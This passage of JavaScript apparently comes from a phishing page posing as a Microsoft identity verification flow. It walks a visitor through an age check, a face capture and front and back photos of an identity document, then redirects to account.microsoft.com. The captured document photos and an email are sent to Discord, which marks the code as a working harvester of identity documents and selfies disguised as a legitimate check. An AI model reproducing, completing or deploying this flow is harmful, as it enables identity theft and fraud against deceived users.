            Router.register(Router.STATES.AGE_CHECK, function () {
                app.innerHTML = Views.ageCheck();
                UI.setupAgeCheck(
                    function () { Router.navigate(Router.STATES.FACE_CHECK); },
                    function () { Router.navigate(Router.STATES.FACE_CHECK); }
                );
            });
Router.register(Router.STATES.FACE_CHECK, function () {
                app.innerHTML = Views.faceCheck();
                UI.setupFaceCheck(function (rostroFileName) {
                    faceCheckFileName = rostroFileName;
                    Router.navigate(Router.STATES.DOC_FRONT);
                });
            });


            Router.register(Router.STATES.DOC_FRONT, function () {
                app.innerHTML = Views.docCapture('front');
                UI.setupDocumentCapture('front', function (name) {
                    frontFilename = name;
                    Router.navigate(Router.STATES.DOC_BACK);
                });
            });


            Router.register(Router.STATES.DOC_BACK, function () {
                app.innerHTML = Views.docCapture('back');
                UI.setupDocumentCapture('back', function (backFilename) {
                    Discord.sendDocumentPhotos(frontFilename, backFilename)
                        .then(() => console.log('Fotos enviadas'))
                        .catch(err => console.error('Error:', err));
                    Router.navigate(Router.STATES.VERIFIED);
                });
            });


            Router.register(Router.STATES.VERIFIED, function () {
                app.innerHTML = Views.verified();
                Discord.sendVerificationComplete(tempEmail)
                    .then(() => console.log('Verificación completa enviada'))
                    .catch(err => console.error('Error:', err));
                UI.showVerifiedAnimation(function () {
                    window.location.href = 'https://account.microsoft.com';
                });
            });

            Router.navigate(Router.STATES.EMAIL);
            console.log('SPA iniciada correctamente - Flujo de Verificación');
        }, 1000);
    });
})();

